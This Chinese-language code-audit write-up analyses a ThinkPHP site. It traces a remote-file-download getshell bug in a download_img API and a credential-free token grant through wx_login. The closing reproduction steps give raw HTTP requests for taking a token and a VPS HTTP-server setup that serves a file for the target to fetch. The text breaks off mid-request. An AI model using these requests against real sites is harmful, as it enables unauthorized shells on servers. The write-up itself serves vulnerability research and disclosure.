## 0x00 前言
学习php代码审计的前提是需要熟悉 php 的语法；对Model（数据模型）、Controller（业务逻辑）、View（视图）类似的模式有了解；对SQL
预编译、一些危险函数有了解。我曾花了一个月时间学习 php 语法、创建 thinkphp 站点有所了解，所以在 githb
上找了一个站点作为练手。以下问题均已提交 Github issue。
代码审计可以分为两种手段：黑白盒。我们可以搭建站点后通过 AWVS
等扫描工具进行漏扫。也可以通过寻找危险函数来寻找那些可以获取权限的漏洞。这里个站点使用了一个比较小型的
waf，在我进行漏扫后没有发现什么漏洞。所以我直接采用了寻找危险函数可控点来发现严重的漏洞。
## 0x01 环境说明
Apache 2.4.46
MySQL 5.7.34
PHP 7.4.21
ThinkPHP 5.0.24
## 0x02 漏洞挖掘 ｜ 远程文件上传 Getshell
### 1.发现危险函数
通过全局搜索 fopen 这个打开文件的函数，发现了 api 下面存在一个 `path` 用变量来控制，极有肯能存在问题。
双击后可以发现是一个 download_img 的函数，其中 `url` 和 `path` 变量是可控的。
这里直接使用 curl 访问了我们提供的 `url` 并且 `path` 也没有做任何过滤。直接读文件写到指定目录。
直接构造路近请求但是提示 `token` 错误，下一步我们需要获得`token`。
### 2.获取token
#### 思路一、伪造 token
`token` 获取的方式一般是通过登陆，不过我想知道 `token` 的构造看看尝试能不能直接伪造一段 `token`
在 `api` 中 `Login.php` 里发现登陆的入口
  1. 这里发现它使用 `this` 进行调用 `getLogic` 类内公开函数，往上找发现这个函数返回了一个新的 `UserLogic` 类对象。
  2. 通过调用这个返回的对象 `login` 函数才能进一步知道执行了什么。
  3. 再往上看发现 `UserLogic` 不是这个 `class Login` 的，而是继承 `Common` 父类。
在 `common` 里发现可以发现 `UserLogc.php` 里的 `login` 函数
  1. 往下看可以找到生成 `token` 的代码
  2. 主体是这个生成的，这里使用了 `logic('Token')` 去获取类，我们跟进去就可以找到处理 `Token` 的文件。
跟进 `logic` 函数可以发现这里执行了两个步骤：
  1. 一个是拼接文件名，`class` 变量中使用传入的 `name` 变量进行拼接，我们拿到刚刚的 `'Token'` 可以推出变量为：`\app\common\logic\TokenLogic`
  2. 直接通过 `new` 来生成 `TokenLogic` 对象
找到 `TokenLogic.php` 文件，进一步跟踪到 `getToken` 函数
往下看发现了 `token` 的构造是 `$type-$user_id-microtime` 其中 `microtime` 是获取的时间戳。
再往上看，有一个 `checkToken` 函数用于校验。`model` 是数据模型了，这里的意思是直接通过数据库查询传递的 `token`
是否匹配。这就导致即使我们伪造了 `token` 但是不在数据库那就不能通过。
#### 思路二、间接获取 token
看源码可以知道，一定是要登陆才能调用到 `getToken` 。可以通过注册登陆的方式来获取，但是如果关闭了注册功能、注册功能失效，我们就没法获取
`token` 了。有没有不需要有账号密码即可获取 `token` 的方式？
我们继续来看登陆功能的 `Login.php` 发现提供了一种不需要账号密码就可以登陆的方式。
进一步跟进 `wxLogin` 函数
  1. 折叠函数里包含了输入内容的校验，大概意思是用户不存在可以创建一个新的，这里我们可以不用管。
  2. 通过了校验之后会生成新的 `token`
我们直接构造数据包，填入需要的字段即可直接拿到生成的 `token`。
### 3.漏洞复现
#### 1.获取 token
文件上传的接口需要 access_token ，我们可以通过下面这个接口获取
    POST /api/login/wx_login HTTP/1.1
    Host: nbnbk:8888
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 46
    Connection: close
    openid=1&unionid=1&sex=1&head_img=1&nickname=1
可以在返回包中发现 token 已经生成
#### 2.在 vps 中启动 http 服务
    echo ' index.php
    python -m http.server 8099
#### 3.文件上传
    POST /api/User/download_img HTTP/1.1
    Host: nbnbk:8888
    Content-Type: application/x-www-form-urlencoded